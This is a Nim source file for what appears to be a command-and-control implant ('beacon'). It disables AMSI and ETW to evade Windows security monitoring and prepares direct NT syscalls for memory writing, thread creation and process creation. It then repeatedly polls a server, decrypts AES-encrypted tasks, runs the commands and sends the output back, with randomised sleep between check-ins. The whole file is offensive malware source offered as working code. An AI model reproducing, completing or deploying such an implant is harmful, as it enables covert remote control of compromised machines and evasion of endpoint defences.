import os, json, strformat
import utils, comms, config, syscalls
proc main() =
    discard PatchAMSI()
    echo "ASMI done!"
    discard PathETW()
    echo "ETW done!"

    makeNtAllocateVirtualMemory()
    makeNtWriteVirtualMemory()
    makeNtCreateThreadEx()
    makeNtCreateNamedPipeFile()
    makeNtCreateProcess()
  
    randomize()

 
    echo fmt"[+] Beacon started with ID {AGENT_ID}"

    while true:
        echo "[*] Sending checkin..."
        let response = sendCheckin(AGENT_ID) #response of the post request made to endpoint , contains (task_id,cmd)

        if response.len > 0:
            let rawtask = decryptJson(response,AES_KEY)
            let parsedtask = parseTask(rawtask)
            let output = execProcess(parsedtask.command)
            discard sendTaskResult(agentID,parsedtask.task_id,parsedtask.command,output)
        randomSleep(SLEEP_MIN, SLEEP_MAX)      
when isMainModule:
  main()
